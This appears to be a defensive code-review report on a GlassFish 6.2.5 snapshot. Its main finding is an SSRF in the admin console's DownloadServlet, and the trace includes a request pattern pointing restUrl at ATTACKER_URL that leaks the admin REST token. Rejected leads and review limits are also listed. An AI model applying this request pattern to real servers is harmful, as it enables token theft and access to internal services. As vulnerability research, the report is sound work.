candidates.attacker_control: The restUrl parameter (plus contentSourceId, instanceName, appName, lbName, target) is fully attacker-controlled and is consumed at LogViewerContentSource lines 59 and 66, LogFilesContentSource lines 65 and 70, ClientStubsContentSource lines 63 and 68, and LBConfigContentSource lines 72 and 77. For the LogViewer source the REST response body is returned to the requester (LogViewerContentSource lines 70-80, streamed by DownloadServlet.writeContent).
candidates.counterevidence_checked: 1) web.xml lines 136-158 restrict /download/* to the admin role, so this is not unauthenticated. 2) RestSessionManager.authenticate binds a REST token to the client address recorded at creation (RestSessionManager lines 139-141), limiting direct replay from a different IP unless the org.glassfish.admin.rest.disable.remote.address.validation property is set. 3) The rest of the console consistently uses the session REST URL (GuiUtil.getSessionValue("REST_URL")), confirming the request parameter is the anomalous, unvalidated source. 4) No server execution was performed, so reachability, Jersey acceptance of foreign absolute URIs and cookie emission are argued from source only. 5) Secure-admin restrictions mean remote exploitation normally requires secure admin or a local/CSRF vector.
candidates.impact: Server-side request forgery executed by the DAS/admin-console process: internal services, localhost-only admin endpoints and metadata URLs can be reached from the server, and for LogViewer the fetched response content is returned to the caller. In addition the admin REST session token is disclosed to an arbitrary external host because it is attached as a cookie to the attacker-controlled URL; that token authenticates to the admin REST interface (RestAdapter/AdminCallbackHandler to RestSessionManager.authenticate). The same ContentSource paths also build temp file names from appName/lbName/target (e.g. ClientStubsContentSource lines 72-75, LBConfigContentSource lines 82-84), allowing server-side writes at attacker-influenced paths under java.io.tmpdir.
candidates.prerequisites: Access to the admin console WAR (DownloadServlet mapped at /download/* in appserver/admingui/war/src/main/webapp/WEB-INF/web.xml lines 93-96). The WAR declares a /* security-constraint with role admin (web.xml lines 137-145), and the server-side call only carries a token once the HTTP session holds AdminConsoleAuthModule.REST_TOKEN (set after login, AdminConsoleAuthModule lines 258-261), so an authenticated admin-console session is the baseline (possibly reached via a cross-site GET riding that session, since doGet delegates to doPost at DownloadServlet lines 133-135). Remote console use normally requires secure admin; otherwise the console is local-only.
candidates.root_cause: The four DownloadServlet ContentSource implementations read the destination host from the untrusted request parameter restUrl and use it directly to build the endpoint given to RestUtil/Jersey, instead of using the session-scoped REST base URL used elsewhere in the console (GuiUtil.getSessionValue("REST_URL")), with no allow-list or validation that the URL targets the local admin REST endpoint. The shared request helpers then attach the session's admin REST token as the gfresttoken cookie to that arbitrary URL.
candidates.title: Admin console DownloadServlet content sources pass a client-controlled restUrl into server-side REST calls, enabling SSRF and admin REST-token disclosure
candidates.trace: Request /download/?contentSourceId=LogViewer&restUrl=ATTACKER_URL&instanceName=x reaches DownloadServlet.doGet/doPost (DownloadServlet lines 145-156) and getContentSource (lines 191-210); LogViewerContentSource.getInputStream builds endpoint = restUrl + "/view-log/" (line 66); RestUtil.getRequestFromServlet (RestUtil lines 800-808) performs JERSEY_CLIENT.target(endpoint).request().cookie(new Cookie(REST_TOKEN_COOKIE, token)).get(...), so an outbound request to the attacker-chosen host is sent with the admin REST token cookie and the response is streamed back via DownloadServlet.writeContent (lines 282-323). LogFiles, ClientStubs and LBConfig use the same pattern with RestUtil.postRestRequestFromServlet (RestUtil lines 941-951) and endpoints built from restUrl at LogFilesContentSource line 70, ClientStubsContentSource line 68 and LBConfigContentSource line 77.
candidates.unverified: Not runtime-confirmed. Open items: practical value of the disclosed REST token given remote-address binding; whether cross-site GET carries the admin session cookie in default cookie configuration; whether any additional validation layer guards /download/*; and the full request-parameter surface of DownloadServlet.Context.getAttribute (lines 395-409), which also falls back to request parameters for attributes such as ContentType.
candidates.weakness_type: CWE-918 Server-Side Request Forgery with CWE-200 exposure of the admin REST token

coverage_summary: Reviewed in detail: admin-console servlets/handlers/utilities (DownloadServlet, all four ContentSources, RestUtil, RestResponse, AdminConsoleAuthModule, CommonHandlers, WoodstockHandler, admingui web.xml/context.xml), admin REST adapter/resources and auth plumbing (RestAdapter, SessionsResource, SecurityUtil, ResourceUtil), admin authentication core (GenericAdminAuthenticator, AdminCallbackHandler, AdminLoginModule, RestSessionManager), security realms (JDBCRealm), web-core request/redirect/path handling (CoyoteAdapter, VirtualServerPipeline, DefaultServlet, WebdavServlet, CGIServlet, ExpandWar), archive extraction call sites, webservices WSDL/handler-chain parsing, and XML parser factory usages. Not reviewed exhaustively: most of the 7,791 files (EJB, JMS, JDBC RA, connectors, persistence, orb, batch, docs, most admin CLI commands) were sampled via targeted searches; the P1 index omits 32 source files and provides no data/control-flow. No builds, tests, scanners or runtime probes were executed.
limitations: No code was executed; reachability, authentication state and cookie behavior are reasoned from source, so the candidate is a lead, not a confirmed vulnerability.
P1 relation index is partial (7,759 of 7,791 files indexed, 32 missing) with no control-flow/data-flow or semantic resolution; index labels are navigation hints only.
Admin-console JSF/JSFT pages are absent from this snapshot, so handler-level attacker control (e.g. for gf.redirect) could not be fully verified.
Coverage was prioritized to security-relevant paths; large functional areas were not reviewed line by line.
Usability of a stolen REST token from another client IP depends on a system property and address binding and was not verified at runtime.

rejected_leads.lead: Ant task AdminTask.java line 106 concatenates a command string into Runtime.exec
rejected_leads.reason: Build-time tooling controlled by the developer running Ant; not a remote trust boundary.

rejected_leads.lead: ZipFile.explode() lacks Zip Slip validation (nucleus/common/common-util ZipFile.java lines 87-141; used by RestoreManager, ModuleExploder, RepositoryManager)
rejected_leads.reason: Missing check is real, but all reachable callers consume archives chosen by an administrator or generated by the DAS, so impact is post-admin/self-inflicted; no lower-privileged supply path found.

rejected_leads.lead: CommonHandlers.gf.redirect calls sendRedirect(page) without URL validation (lines 647-667)
rejected_leads.reason: No caller feeding a request-controlled page was found in the snapshot; the JSF pages invoking handlers are not present, so attacker control is unestablished.
Servlet is not enabled by default and requires explicit web.xml configuration in a deployed application.

rejected_leads.lead: InputValidationUtil.validateStringforCRLF checks only encoded CR/LF sequences
rejected_leads.reason: Defense-in-depth weakness; raw CR/LF are converted to spaces by removeLinearWhiteSpaces at the call sites, and no directly exploitable sink was confirmed.

rejected_leads.lead: SessionsResource uses client-supplied remoteHostName for a second authentication pass
rejected_leads.reason: Investigated as a remote-access bypass, but RestAdapter already authenticates with the real remote host before the resource is reached and the token is created with grizzlyRequest.getRemoteAddr(); no bypass substantiated from source.

summary: Defensive review of the GlassFish 6.2.5 snapshot (7,791 visible files; 6,005 Java). Scope and P1 index limits were accounted for (7,759 indexed files, 32 source files missing from index, no control/data-flow facts; index labels are navigational only). I traced the admin-console request path, admin REST token plumbing, web-core redirect/path handling, security realms/login modules, archive extraction, and XML parser hardening. Strongest source-supported issue: admin-console DownloadServlet content sources use the client-supplied request parameter restUrl as the target of server-side REST calls and attach the admin REST token cookie to it (SSRF plus admin token disclosure; for LogViewer the fetched body is streamed back). Other leads were examined and rejected or kept as unconfirmed.
